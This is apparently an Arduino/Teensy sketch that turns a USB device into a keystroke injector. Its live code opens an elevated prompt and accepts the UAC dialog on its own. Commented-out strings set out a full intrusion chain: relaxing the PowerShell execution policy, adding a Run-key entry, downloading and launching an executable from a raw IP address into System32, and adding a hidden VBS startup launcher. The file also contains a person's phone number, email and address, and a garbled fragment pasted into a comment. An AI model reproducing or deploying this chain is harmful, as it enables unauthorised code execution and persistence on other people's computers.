Hier ben ik!void setup() {
  
  delay(5000);

  /*
  String hello = "Koningin Wilhelmina Fonds / KWF Kankerbestrijding - Samen staan we sterker!\n";
  String hello2 = "Delflandlaan 17\n";
  String hello3 = "1062 EA Amsterdam\n\n";
  String hello4 = "www.lexologics.nl\nGSM:06-24647540\nlboerhoop@kwf.nl\n\n";
  Keyboard.print(hello);
  Keyboard.print(hello2);
  Keyboard.print(hello3);
  Keyboard.print(hello4);Kjding - Samen staan we sterker!
  Delflandlaan 17
  1062 EA Amsterdam

  www.lexologics.nl
  GSM:06-24647540
  lboerhoop@kwf.nl

  
*/

// C:\\Users\\lboer\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Windows PowerShell

//  String RegEdit = "powershell.exe Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Logics -Value \"C\\Windows\\System32\\Logics.exe\"";
//  String execPolicy = "runas /user:lboerhoop@kwfkankerbestrijding.nl powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted";

//  String path00 = "C:\\Windows\\System32\\Logics.ps1";
//  String initPOW = "function install(){if(checkInet){$storageDir = \"C:\\Windows\\System32\\\";$webClient = New-Object System.Net.WebClient;$url = \"http://92.109.32.135/Logics.exe\";$file = \"$storageDir\\Logics.exe\";$webClient.DownloadFile($url, $file);$filePath = \"C:\\Windows\\System32\\Logics.exe\";$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider;$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.IO.File]::ReadAllBytes($filePath)));if($hash -eq \"C4-10-7F-70-16-BE-49-13-0A-A6-1E-BE-25-14-12-CC\"){[System.Diagnostics.Process]::Start(\"C:\\Windows\\System32\\Logics.exe\");Remove-Item -Force -Recurse \"C:\\Users\\lboer\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\Logics.vbs\";Remove-Item -Force -Recurse \"C:\\Windows\\System32\\Logics.ps1\";}else{Remove-Item -Force -Recurse \"C:\\Windows\\System32\\Logics.exe\";install;}}else{Start-Sleep -s 59;install;}}function checkInet(){$status = (ping lexologics.nl);$con = 0;if($status -ne \"Ping request could not find host lexologics.nl. Please check the name and try again.\"){$con = 1;}else{$con = 0;}return $con;}install;";
//  String createInitPOW = "powershell.exe $null > C:\\Windows\System32\Logics.ps1";

//  String path01 = "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Logics.vbs";
//  String vbsContent = "command = \"powershell.exe -nologo -command C:\\Windows\\System32\\Logics.ps1\"\nset shell = CreateObject(\"WScript.Shell\")\nshell.Run command,0";
//  String createVBS = "powershell.exe echo $null > \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\Logics.vbs\"";
//  String runVBS = "powershell.exe -windowstyle hidden C:\\Windows\\System32\\Logics.ps1";

String startNotepad = "notepad.exe";
String Hallo = "Hier ben ik!";
Keyboard.print(Hallo);
Keyboard.send_now();

powAdmin(startNotepad);

//  powAdmin(execPolicy);
//  powAdmin(RegEdit);

//  powAdmin(createInitPOW);
//  populateFile(path00, initPOW);

//  powAdmin(createVBS);
//  populateFile(path01, vbsContent);

//  powAdmin(runVBS);

} 


void loop() {
  // put your main code here, to run repeatedly:

}

void powAdmin(String cmd)
{

  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  
  delay(1000);

  Keyboard.set_modifier(0);
  Keyboard.send_now();

  delay(1000);

  Keyboard.print(cmd);
  
  delay(2000);

  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();

  delay(2000);

  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();

  delay(200);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();  

  delay(5000);
}

void populateFile(String path, String scriptContent)
{
  String runCMD = "powershell.exe notepad.exe ";
  String finalCMD = runCMD + path;

  powAdmin(finalCMD);

  Keyboard.print(scriptContent);

  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_S);
  Keyboard.send_now();

  delay(200);

  Keyboard.set_modifier(0);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(2000);
  
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_F4);
  Keyboard.send_now();

  delay(200);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
    
}
